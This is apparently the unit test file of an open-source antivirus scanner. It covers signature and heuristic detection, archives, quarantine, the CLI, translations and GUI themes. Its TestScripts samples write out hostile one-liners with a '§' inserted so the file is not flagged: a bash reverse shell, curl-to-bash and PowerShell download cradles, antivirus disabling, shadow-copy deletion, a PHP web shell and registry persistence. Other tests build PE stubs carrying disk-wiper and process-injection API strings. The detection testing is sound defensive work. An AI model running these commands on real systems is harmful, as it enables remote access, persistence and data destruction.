import io
import json
import os
import struct
import sys
import tempfile
import unittest
import zipfile
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

from wedontlikeit import archives, i18n, platforms, scanner as scanner_mod
from wedontlikeit.cli import main
from wedontlikeit.config import Config
from wedontlikeit.monitor import Monitor
from wedontlikeit.quarantine import Quarantine
from wedontlikeit.scanner import Engine, ScanConfig
from wedontlikeit.signatures import SignatureDB
from wedontlikeit.updater import update

ROOT = Path(__file__).resolve().parent.parent

# Samples are built at run time: the "§" is removed so that THIS file
# is never flagged by the antivirus itself.
def S(text: str) -> bytes:
    return text.replace("§", "").encode()


EICAR = S(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-§ANTIVIRUS-TEST-FILE!$H+H*")


def make_pe(sections=(), extra=b""):
    """Smallest valid PE. sections: list of (name, characteristics, data)."""
    e_lfanew, opt_size = 0x40, 0xE0
    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, e_lfanew)
    coff = b"PE\0\0" + struct.pack("<HHIIIHH", 0x14C, len(sections), 0, 0, 0, opt_size, 0x0102)
    table_off = e_lfanew + 24 + opt_size
    data_off = (table_off + 40 * len(sections) + 0x1FF) & ~0x1FF
    table, body = b"", b""
    for name, chars, data in sections:
        ptr = data_off + len(body)
        table += name.ljust(8, b"\0") + struct.pack("<IIIIIIHHI", len(data), 0x1000, len(data), ptr, 0, 0, 0, 0, chars)
        body += data
    head = bytes(dos) + coff + b"\0" * opt_size + table
    return head + b"\0" * (data_off - len(head)) + body + extra


EXEC, WRITE, READ = 0x20000000, 0x80000000, 0x40000000


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.home = self.tmp / "_home"
        self._env = mock.patch.dict(os.environ, {"WEDONTLIKEIT_HOME": str(self.home)})
        self._env.start()
        self.engine = Engine(SignatureDB.default())

    def tearDown(self):
        self._env.stop()
        self._tmp.cleanup()

    def write(self, name, data):
        p = self.tmp / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        return p

    def names(self, path_or_dets):
        dets = self.engine.scan_path(path_or_dets) if isinstance(path_or_dets, Path) else path_or_dets
        return {d.name for d in dets}


class TestSignatures(Base):
    def test_eicar_by_hash_and_pattern(self):
        n = self.names(self.write("eicar.com", EICAR))
        self.assertIn("Test.EICAR", n)
        self.assertIn("Test.EICAR.Pattern", n)

    def test_pattern_in_the_middle(self):
        n = self.names(self.write("m.bin", os.urandom(5000) + EICAR + os.urandom(5000)))
        self.assertIn("Test.EICAR.Pattern", n)
        self.assertNotIn("Test.EICAR", n)

    def test_big_file_in_chunks(self):
        eng = Engine(SignatureDB.default(), ScanConfig(full_limit=10))
        with mock.patch.object(scanner_mod, "CHUNK", 16):
            p = self.write("big.bin", b"A" * 30 + EICAR + b"B" * 30)
            self.assertIn("Test.EICAR.Pattern", {d.name for d in eng.scan_path(p)})

    def test_clean_file(self):
        self.assertEqual(self.engine.scan_path(self.write("hello.txt", b"hello world\n")), [])

    def test_user_and_extra_signatures(self):
        udir = platforms.user_signature_dir()
        udir.mkdir(parents=True)
        (udir / "mine.patterns").write_text("My.Test 6d616c776172652d6669637469636961\n")
        extra = self.tmp / "extra"
        extra.mkdir()
        (extra / "x.hashes").write_text("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n")
        eng = Engine(SignatureDB.default([extra]))
        self.assertIn("My.Test", {d.name for d in eng.scan_path(self.write("a.txt", b"xx malware-ficticia yy"))})
        self.assertIn("x", {d.name for d in eng.scan_path(self.write("empty", b""))})  # name = file stem

    def test_allowlist(self):
        p = self.write("eicar.com", EICAR)
        with redirect_stdout(io.StringIO()):
            main(["allow", str(p)])
        self.assertEqual(Engine(SignatureDB.default()).scan_path(p), [])

    def test_invalid_pattern(self):
        with self.assertRaises(ValueError):
            SignatureDB().load_patterns("X 0011")  # too short


class TestFileHeuristics(Base):
    def test_double_extension(self):
        self.assertIn("Heuristic.DoubleExtension", self.names(self.write("photo.jpg.exe", b"x")))
        self.assertIn("Heuristic.DoubleExtension", self.names(self.write("doc.pdf      .scr", b"x")))

    def test_rtlo_filename(self):
        try:
            p = self.write("invoice‮fdp.exe", b"x")
        except (OSError, UnicodeError):
            self.skipTest("filesystem rejects the character")
        self.assertIn("Heuristic.RTLOFilename", self.names(p))

    def test_disguised_elf(self):
        self.assertIn("Heuristic.DisguisedELF", self.names(self.write("notes.pdf", b"\x7fELF" + b"\0" * 100)))

    def test_disguised_macho(self):
        self.assertIn("Heuristic.DisguisedMachO", self.names(self.write("f.jpg", b"\xcf\xfa\xed\xfe" + b"\0" * 64)))

    def test_java_class_is_not_macho(self):
        self.assertEqual(self.names(self.write("a.png", b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\0" * 64)), set())

    def test_text_starting_with_mz_is_not_pe(self):
        self.assertEqual(self.names(self.write("readme.txt", b"MZ and some other words " * 10)), set())

    def test_pe_upx(self):
        pe = make_pe([(b"UPX0", EXEC | WRITE | READ, b"\0" * 512), (b"UPX1", EXEC | WRITE | READ, b"\0" * 512)])
        self.assertIn("Heuristic.PE.Packer.UPX", self.names(self.write("p.exe", pe)))

    def test_pe_encrypted_code(self):
        pe = make_pe([(b".text", EXEC | READ, os.urandom(64 * 1024))])
        self.assertIn("Heuristic.PE.EncryptedCode", self.names(self.write("p.exe", pe)))

    def test_normal_pe_is_clean(self):
        pe = make_pe([(b".text", EXEC | READ, b"\x90\xc3" * 4096), (b".data", READ | WRITE, b"\0" * 512)])
        self.assertEqual(self.names(self.write("ok.exe", pe)), set())

    def test_pe_injection(self):
        apis = b"\0".join([b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread"])
        pe = make_pe([(b".text", EXEC | READ, b"\x90" * 512)], extra=apis)
        self.assertIn("Heuristic.PE.ProcessInjection", self.names(self.write("i.exe", pe)))

    def pe_with(self, *strings):
        return make_pe([(b".text", EXEC | READ, b"\x90" * 512)], extra=b"\0".join(strings))

    def test_mbr_wiper_like_memz(self):
        # what MEMZ does: open \\.\PhysicalDrive0, write a new boot sector, then force a blue screen
        pe = self.pe_with(b"CreateFileA", b"WriteFile", b"\\\\.\\PhysicalDrive0", b"RtlAdjustPrivilege",
                          b"NtRaiseHardError")
        names = self.names(self.write("memz-like.exe", pe))
        self.assertIn("Heuristic.PE.DiskWiper", names)
        self.assertNotIn("Heuristic.PE.RawDiskWrite", names)

    def test_wiper_with_wide_string_and_shutdown(self):
        pe = self.pe_with(b"WriteFile", "\\\\.\\PHYSICALDRIVE1".encode("utf-16-le"), b"ExitWindowsEx")
        self.assertIn("Heuristic.PE.DiskWiper", self.names(self.write("w.exe", pe)))

    def test_disk_tool_is_only_low(self):
        # a USB image writer (Rufus, Etcher...) writes to the raw disk but doesn't crash the machine
        pe = self.pe_with(b"CreateFileW", b"WriteFile", b"DeviceIoControl", b"\\\\.\\PhysicalDrive2")
        dets = self.engine.scan_path(self.write("usbwriter.exe", pe))
        self.assertEqual([(d.name, d.severity) for d in dets], [("Heuristic.PE.RawDiskWrite", "low")])

    def test_raw_disk_without_writing_is_fine(self):
        pe = self.pe_with(b"CreateFileW", b"ReadFile", b"\\\\.\\PhysicalDrive0", b"ExitWindowsEx")
        self.assertEqual(self.names(self.write("diskinfo.exe", pe)), set())

    def test_writing_files_and_shutting_down_is_fine(self):
        pe = self.pe_with(b"CreateFileW", b"WriteFile", b"C:\\Users\\Public\\log.txt", b"ExitWindowsEx")
        self.assertEqual(self.names(self.write("updater.exe", pe)), set())

    def test_physicaldrive_text_in_a_document_is_fine(self):
        txt = b"To image a disk, open \\\\.\\PhysicalDrive0 with CreateFile and call WriteFile, then ExitWindowsEx."
        self.assertEqual(self.names(self.write("notes.txt", txt)), set())

    def test_elf_without_sections_and_high_entropy(self):
        elf = b"\x7fELF\x02\x01\x01" + b"\0" * 57 + os.urandom(64 * 1024)  # e_shnum = 0
        self.assertIn("Heuristic.ELF.Packed", self.names(self.write("bin", elf)))

    def test_real_system_elf_is_clean(self):
        if not sys.platform.startswith("linux"):
            self.skipTest("Linux only")
        exe = Path(os.path.realpath(sys.executable))
        self.assertEqual({n for n in self.names(exe) if n.startswith("Heuristic.ELF")}, set())

    def test_elf_upx(self):
        self.assertIn("Heuristic.ELF.Packer.UPX", self.names(self.write("bin", b"\x7fELF" + b"\0" * 200 + b"UPX!" + b"\0" * 50)))


class TestScripts(Base):
    CASES = {
        "Script.ReverseShell": "bash -§i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "Script.DownloadAndRun": "cu§rl -fsSL http://example.invalid/x.sh | bash",
        "PowerShell.DownloadCradle": "I§EX (New-Object Net.Web§Client).Download§String('http://x.invalid/a')",
        "PowerShell.EncodedCommand": "power§shell.exe -nop -enc " + "QQBCAEMA" * 8,
        "Evasion.DisableAntivirus": "Set-Mp§Preference -DisableRealtimeMonitoring $true",
        "Ransomware.DeleteBackups": "vss§admin delete shadows /all /quiet",
        "Ransomware.RansomNote": "All your files have been encr§ypted! Pay 0.5 bit§coin to recover",
        "LOLBin.Download": "cert§util -urlcache -split -f http://x.invalid/a.exe a.exe",
        "Script.Obfuscated": "<?php ev§al(base64_decode('ZWNobyAx')); ?>",
        "Script.WebShell": "<?php sys§tem($_GET['c']); ?>",
        "Miner.Crypto": "./miner -o strat§um+tcp://pool.invalid:3333 -u x",
        "MacOS.PasswordPrompt": 'osascript -e \'display dia§log "Password:" default answer "" with hidden answer true\'',
        "Persistence.Windows": r"reg add HKCU\Soft§ware\Microsoft\Windows\CurrentVersion\Run /v x /d y",
    }

    def test_rules(self):
        for name, sample in self.CASES.items():
            with self.subTest(name):
                self.assertIn(name, self.names(self.write("sample.txt", S(sample))))

    def test_short_cradle(self):
        self.assertIn("PowerShell.DownloadCradle", self.names(self.write("a.ps1", S("iw§r https://x.invalid/a.ps1 | i§ex"))))

    def test_loose_words_are_not_a_cradle(self):
        texto = b"\0".join([b"irm", b"blah", b"iex", b"opcoes"]) * 20
        self.assertNotIn("PowerShell.DownloadCradle", self.names(self.write("bin.dat", texto)))

    def test_powershell_utf16(self):
        data = b"\xff\xfe" + "vss§admin delete shadows".replace("§", "").encode("utf-16-le")
        self.assertIn("Ransomware.DeleteBackups", self.names(self.write("a.ps1", data)))

    def test_utf16_strings_in_binary(self):
        wide = "power§shell -w hidden -c x".replace("§", "").encode("utf-16-le")
        self.assertIn("PowerShell.HiddenWindow", self.names(self.write("shortcut.lnk", b"L\0\0\0" + b"\0" * 40 + wide)))

    def test_normal_text(self):
        txt = b"To install, run pip install . and then use the command in a terminal.\n" * 50
        self.assertEqual(self.names(self.write("README.txt", txt)), set())


class TestArchives(Base):
    def zip_bytes(self, members, encrypted=False):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in members.items():
                zf.writestr(name, data)
        raw = bytearray(buf.getvalue())
        if encrypted:  # zipfile can't write encrypted zips; set the flag in the central directory by hand
            pos = raw.find(b"PK\x01\x02")
            while pos != -1:
                raw[pos + 8] |= 0x1
                pos = raw.find(b"PK\x01\x02", pos + 4)
        return bytes(raw)

    def test_eicar_in_nested_zip(self):
        inner = self.zip_bytes({"folder/eicar.com": EICAR})
        p = self.write("outer.zip", self.zip_bytes({"inner.zip": inner}))
        dets = self.engine.scan_path(p)
        hit = [d for d in dets if d.name == "Test.EICAR"]
        self.assertEqual(hit[0].inner, "inner.zip!folder/eicar.com")
        self.assertEqual(hit[0].path, str(p))

    def test_encrypted_zip_with_executable(self):
        p = self.write("invoice.zip", self.zip_bytes({"invoice.exe": b"x" * 100}, encrypted=True))
        self.assertIn("Heuristic.EncryptedZipWithExecutable", self.names(p))

    def test_zip_bomb(self):
        with mock.patch.object(archives, "BOMB_MIN_SIZE", 1 << 20):
            p = self.write("bomb.zip", self.zip_bytes({"zeros.bin": b"\0" * (2 << 20)}))
            self.assertIn("Heuristic.ZipBomb", self.names(p))

    def test_office_macro(self):
        ole = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 100 + "_VBA_PROJECT".encode("utf-16-le")
               + b"\0" * 50 + b"Sub AutoOpen()")
        p = self.write("report.docm", self.zip_bytes({"word/document.xml": b"<w/>", "word/vbaProject.bin": ole}))
        self.assertIn("Office.AutoExecMacro", self.names(p))

    def test_archives_off(self):
        p = self.write("a.zip", self.zip_bytes({"eicar.com": EICAR}))
        eng = Engine(SignatureDB.default(), ScanConfig(archives=False))
        self.assertEqual(eng.scan_path(p), [])


class TestScan(Base):
    def test_recursive_with_excludes(self):
        self.write("a/b/c/eicar.txt", EICAR)
        self.write("a/clean.txt", b"ok")
        self.write("a/skip/eicar2.txt", EICAR)
        eng = Engine(SignatureDB.default(), ScanConfig(exclude=(str(self.tmp / "a" / "skip"),)))
        r = eng.scan([self.tmp / "a"])
        self.assertEqual(r.scanned, 2)
        self.assertEqual({Path(d.path).name for d in r.detections}, {"eicar.txt"})

    def test_explicit_target_beats_exclude(self):
        self.write("x/eicar.txt", EICAR)
        eng = Engine(SignatureDB.default(), ScanConfig(exclude=(str(self.tmp),)))
        self.assertEqual(eng.scan([self.tmp / "x"]).infected_files, 1)

    def test_skips_symlinks(self):
        alvo = self.write("d/eicar.txt", EICAR)
        try:
            (self.tmp / "d" / "link").symlink_to(alvo)
        except (OSError, NotImplementedError):
            self.skipTest("no permission to create symlinks")
        self.assertEqual(self.engine.scan([self.tmp / "d"]).scanned, 1)

    def test_parallel_matches_sequential(self):
        for i in range(12):
            self.write(f"p/{i}.txt", EICAR if i % 3 == 0 else b"ok %d" % i)
        seq = self.engine.scan([self.tmp / "p"], jobs=1)
        par = self.engine.scan([self.tmp / "p"], jobs=2)
        key = lambda r: sorted((d.path, d.name) for d in r.detections)  # noqa: E731
        self.assertEqual(key(seq), key(par))
        self.assertEqual(seq.scanned, par.scanned)

    def test_stop_event(self):
        import threading
        for i in range(5):
            self.write(f"s/{i}.txt", b"x")
        stop = threading.Event()
        stop.set()
        r = self.engine.scan([self.tmp / "s"], stop=stop)
        self.assertTrue(r.cancelled)
        self.assertEqual(r.scanned, 0)

    def test_max_size(self):
        self.write("t/big.bin", b"0" * 2048)
        eng = Engine(SignatureDB.default(), ScanConfig(max_size=1024))
        self.assertEqual(eng.scan([self.tmp / "t"]).skipped, 1)

    def test_project_does_not_flag_itself(self):
        eng = Engine(SignatureDB.default(user=False), ScanConfig(exclude=(str(ROOT / ".git"),)))
        r = eng.scan([ROOT])
        self.assertEqual([(d.label, d.name) for d in r.detections], [])


class TestQuarantine(Base):
    def test_quarantine_and_restore(self):
        q = Quarantine()
        p = self.write("eicar.com", EICAR)
        qid = q.add(p, "Test.EICAR")
        self.assertFalse(p.exists())
        self.assertNotIn(b"EICAR", (q.dir / f"{qid}.bin").read_bytes())
        self.assertEqual(q.list()[0]["sha256"], "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f")
        q.restore(qid)
        self.assertEqual(p.read_bytes(), EICAR)
        self.assertEqual(q.list(), [])
        if os.name == "posix":
            self.assertEqual(p.stat().st_mode & 0o111, 0)

    def test_restore_never_overwrites(self):
        q = Quarantine()
        p = self.write("e.com", EICAR)
        qid = q.add(p, "x")
        p.write_bytes(b"new")
        with self.assertRaises(FileExistsError):
            q.restore(qid)


class TestMonitor(Base):
    def test_flags_new_file(self):
        folder = self.tmp / "dl"
        folder.mkdir()
        mon = Monitor(self.engine, [folder], settle=0)
        self.assertEqual(mon.poll(), [])
        self.write("dl/new.com", EICAR)
        hits = mon.poll()
        self.assertEqual(len(hits), 1)
        self.assertEqual(mon.poll(), [])  # no repeats


class TestUpdater(Base):
    def test_update_from_local_file(self):
        h1, h2 = "a" * 64, "b" * 64
        src = self.write("export.txt", f"# comment\n{h1}\n{h2}\n".encode())
        dest = platforms.user_signature_dir()
        self.assertEqual(update(dest, src.as_uri()), (2, 2))
        self.assertEqual(update(dest, src.as_uri()), (0, 2))
        self.assertIn(h1, SignatureDB.default().hashes)


class TestCLI(Base):
    def run_cli(self, *argv):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = main(list(argv))
        return rc, buf.getvalue()

    def test_exit_codes(self):
        clean = self.write("clean/a.txt", b"ok")
        dirty = self.write("dirty/eicar.com", EICAR)
        self.assertEqual(self.run_cli("scan", "-j", "1", str(clean.parent))[0], 0)
        self.assertEqual(self.run_cli("scan", "-j", "1", str(dirty.parent))[0], 1)

    def test_auto_quarantine(self):
        dirty = self.write("dirty/eicar.com", EICAR)
        rc, _ = self.run_cli("scan", "-j", "1", "-q", str(dirty.parent))
        self.assertEqual(rc, 1)
        self.assertFalse(dirty.exists())
        self.assertEqual(len(Quarantine().list()), 1)

    def test_medium_only_with_quarantine_all(self):
        p = self.write("h/photo.jpg.exe", b"x")
        self.run_cli("scan", "-j", "1", "-q", str(p.parent))
        self.assertTrue(p.exists())
        self.run_cli("scan", "-j", "1", "--quarantine-all", str(p.parent))
        self.assertFalse(p.exists())

    def test_json(self):
        self.write("j/eicar.com", EICAR)
        rc, out = self.run_cli("scan", "--json", "-j", "1", str(self.tmp / "j"))
        data = json.loads(out)
        self.assertEqual(rc, 1)
        self.assertEqual(data["scanned"], 1)
        self.assertTrue(any(d["name"] == "Test.EICAR" for d in data["detections"]))

    def test_info(self):
        rc, out = self.run_cli("info")
        self.assertEqual(rc, 0)
        self.assertIn(platforms.system_name(), out)
        self.assertIn("Data folder", out)

    def test_portuguese(self):
        rc, out = self.run_cli("--lang", "pt", "info")
        self.assertIn("Pasta de dados", out)
        rc, out = self.run_cli("--lang", "de_DE", "info")
        self.assertIn("Datenordner", out)
        i18n.set_lang("en")


class TestI18n(Base):
    def test_default_is_english(self):
        with mock.patch.dict(os.environ, {"WEDONTLIKEIT_LANG": ""}):
            self.assertEqual(i18n.resolve(None), "en")

    def test_saved_setting_and_override(self):
        with mock.patch.dict(os.environ, {"WEDONTLIKEIT_LANG": ""}):
            Config(lang="pt").save()
            self.assertEqual(i18n.resolve(None), "pt")
            self.assertEqual(i18n.resolve("en"), "en")

    def test_every_key_is_translated(self):
        import re
        used = set()
        for f in (ROOT / "wedontlikeit").glob("*.py"):
            used |= set(re.findall(r"""\bt\(\s*["']([a-z_]+\.[a-z_]+)["']""", f.read_text(encoding="utf-8")))
        self.assertEqual(sorted(used - i18n.keys("en")), [])

    def test_all_locales_match_english(self):
        import re
        ph = lambda text: set(re.findall(r"\{(\w+)\}", text))  # noqa: E731
        en = i18n.raw("en")
        for code in i18n.LANGS:
            with self.subTest(code):
                loc = i18n.raw(code)
                self.assertEqual(sorted(set(en) - set(loc)), [], "missing keys")
                self.assertEqual(sorted(set(loc) - set(en)), [], "unknown keys")
                for key, value in en.items():
                    want = set().union(*(ph(v) for v in value.values())) if isinstance(value, dict) else ph(value)
                    got = loc[key]
                    if isinstance(value, dict):
                        self.assertIsInstance(got, dict, key)
                        self.assertEqual(set(got), i18n.PLURAL_FORMS[code], f"{key}: plural forms")
                        for form in got.values():
                            self.assertTrue(ph(form) <= want, f"{key}: placeholders")
                        self.assertEqual(set().union(*(ph(v) for v in got.values())), want, key)
                    else:
                        self.assertIsInstance(got, str, key)
                        self.assertEqual(ph(got), want, f"{key}: placeholders")
                        self.assertTrue(got.strip(), key)

    def test_every_language_renders(self):
        for code in i18n.LANGS:
            i18n.set_lang(code)
            for key in i18n.keys("en"):
                self.assertTrue(i18n.t(key, n=3, mb=1, id="x", path="p", err="e", system="s", url="u",
                                       new=1, total=2, dir="d", digest="g", h=1, p=2, a=3, threat="T",
                                       file="f", name="n"))
        i18n.set_lang("en")

    def test_plural_rules(self):
        cases = {
            "en": {1: "one", 2: "other", 0: "other"},
            "pt": {0: "one", 1: "one", 2: "other"},
            "fr": {0: "one", 1: "one", 2: "other"},
            "ru": {1: "one", 21: "one", 11: "many", 2: "few", 4: "few", 12: "many", 5: "many", 22: "few"},
            "pl": {1: "one", 21: "many", 2: "few", 12: "many", 5: "many", 22: "few"},
            "ja": {1: "other", 5: "other"},
        }
        for code, table in cases.items():
            for n, cat in table.items():
                self.assertEqual(i18n.plural_category(code, n), cat, (code, n))

    def test_plural_text_and_numbers(self):
        i18n.set_lang("ru")
        self.assertEqual(i18n.t("q.h", n=1), "1 файл под замком.")
        self.assertEqual(i18n.t("q.h", n=3), "3 файла под замком.")
        self.assertEqual(i18n.t("q.h", n=5), "5 файлов под замком.")
        i18n.set_lang("de")
        self.assertEqual(i18n.t("header.sigs", n=1234), "1.234 Signaturen")
        i18n.set_lang("en")
        self.assertEqual(i18n.t("header.sigs", n=1), "1 signature")
        self.assertEqual(i18n.t("header.sigs", n=1234), "1,234 signatures")

    def test_system_language(self):
        with mock.patch.object(i18n, "_system_candidates", return_value=["C.UTF-8", "fr_CA.UTF-8", "de_DE"]):
            self.assertEqual(i18n.system_language(), "fr")
        with mock.patch.object(i18n, "_system_candidates", return_value=["xx_YY", "eo"]):
            self.assertIsNone(i18n.system_language())

    def test_system_language_from_linux_env(self):
        if not sys.platform.startswith("linux"):
            self.skipTest("Linux only")
        env = {"LANGUAGE": "pt_BR:pt:en", "LC_ALL": "", "LC_MESSAGES": "", "LANG": "en_US.UTF-8"}
        with mock.patch.dict(os.environ, env):
            self.assertEqual(i18n.system_language(), "pt")

    def test_setup_flag(self):
        self.assertFalse(Config.load().setup_done)
        Config(setup_done=True, lang="ja").save()
        self.assertTrue(Config.load().setup_done)

    def test_normalize(self):
        self.assertEqual(i18n.normalize("pt_BR.UTF-8"), "pt")
        self.assertEqual(i18n.normalize("zh-CN"), "zh")
        self.assertEqual(i18n.normalize("DE"), "de")
        self.assertIsNone(i18n.normalize("xx"))
        self.assertEqual(i18n.upper("dosya", "tr"), "DOSYA")
        self.assertEqual(i18n.upper("önem derecesi", "tr"), "ÖNEM DERECESİ")


class TestConfig(Base):
    def test_round_trip(self):
        c = Config.load()
        self.assertTrue(c.heuristics)
        c.auto_quarantine = True
        c.watch_folders = ["/a"]
        c.save()
        self.assertEqual(Config.load().watch_folders, ["/a"])
        self.assertTrue(Config.load().auto_quarantine)

    def test_ignores_unknown_and_broken(self):
        platforms.config_file().parent.mkdir(parents=True, exist_ok=True)
        platforms.config_file().write_text('{"lang": "pt", "nope": 1}')
        self.assertEqual(Config.load().lang, "pt")
        platforms.config_file().write_text("{broken")
        self.assertEqual(Config.load().lang, "en")


class TestThemes(Base):
    def setUp(self):
        super().setUp()
        try:
            from wedontlikeit import gui
        except Exception as exc:  # noqa: BLE001 - tkinter missing on this Python
            self.skipTest(f"tkinter not available: {exc}")
        if gui.tk is None:
            self.skipTest("tkinter not available")
        self.gui = gui

    def tearDown(self):
        if hasattr(self, "gui"):
            self.gui.apply_theme("light")
        super().tearDown()

    def test_every_theme_defines_every_color(self):
        keys = set(self.gui.THEMES["light"])
        for name, theme in self.gui.THEMES.items():
            self.assertEqual(set(theme), keys, name)
            for k, v in theme.items():
                if isinstance(v, str):
                    self.assertRegex(v, r"^#[0-9A-Fa-f]{6}$", f"{name}.{k}")

    def test_every_theme_has_a_name_in_every_language(self):
        for code in i18n.LANGS:
            for name in self.gui.THEME_CHOICES:
                self.assertIn(f"theme.{name}", i18n.raw(code), code)

    @staticmethod
    def contrast(a, b):
        def lum(hexcolor):
            rgb = [int(hexcolor[i:i + 2], 16) / 255 for i in (1, 3, 5)]
            lin = [c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4 for c in rgb]
            return 0.2126 * lin[0] + 0.7152 * lin[1] + 0.0722 * lin[2]
        hi, lo = sorted((lum(a), lum(b)), reverse=True)
        return (hi + 0.05) / (lo + 0.05)

    def test_text_is_readable_in_every_theme(self):
        """WCAG: 4.5:1 for text (7:1 in high contrast); findings must stand out on tables."""
        for name, th in self.gui.THEMES.items():
            with self.subTest(name):
                need = 7 if name == "contrast" else 4.5
                self.assertGreaterEqual(self.contrast(th["INK"], th["PAPER"]), need)
                self.assertGreaterEqual(self.contrast(th["INK"], th["CARD"]), need)
                self.assertGreaterEqual(self.contrast(th["MUTED"], th["PAPER"]), 4.5)
                for sev in ("RED", "AMBER"):
                    self.assertGreaterEqual(self.contrast(th[sev], th["CARD"]), 4.5, sev)
                # "medium" must look different from normal text, or it disappears
                self.assertNotEqual(th["AMBER"], th["INK"])

    def test_auto_follows_the_system(self):
        p = self.gui.platforms
        with mock.patch.object(p, "system_high_contrast", return_value=False), \
                mock.patch.object(p, "system_dark_mode", return_value=True):
            self.gui.apply_theme("auto")
            self.assertEqual((self.gui.CHOICE, self.gui.THEME), ("auto", "dark"))
        with mock.patch.object(p, "system_high_contrast", return_value=False), \
                mock.patch.object(p, "system_dark_mode", return_value=None):
            self.assertEqual(self.gui.resolve_theme("auto"), "light")
        with mock.patch.object(p, "system_high_contrast", return_value=True):
            self.assertEqual(self.gui.resolve_theme("auto"), "contrast")

    def test_apply_theme(self):
        self.gui.apply_theme("terminal")
        self.assertEqual(self.gui.PAPER, self.gui.THEMES["terminal"]["PAPER"])
        self.assertEqual(self.gui.SEV_FG["high"], self.gui.THEMES["terminal"]["RED"])
        self.gui.apply_theme("nonsense")
        self.assertEqual(self.gui.THEME, "light")

    def test_saved_theme(self):
        Config(theme="dark").save()
        self.assertEqual(Config.load().theme, "dark")


class TestPlatforms(unittest.TestCase):
    def test_folders(self):
        with mock.patch.dict(os.environ, {"WEDONTLIKEIT_HOME": "/x/y"}):
            self.assertEqual(platforms.quarantine_dir(), Path("/x/y") / "quarantine")
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("WEDONTLIKEIT_HOME", None)
            d = str(platforms.data_dir())
            if sys.platform == "win32":
                self.assertIn("WeDontLikeIt", d)
            elif sys.platform == "darwin":
                self.assertIn("Application Support", d)
            else:
                self.assertTrue(d.endswith("wedontlikeit"))

    def test_quick_scan_paths_exist(self):
        for p in platforms.quick_scan_paths():
            self.assertTrue(p.is_dir())


if __name__ == "__main__":
    unittest.main()
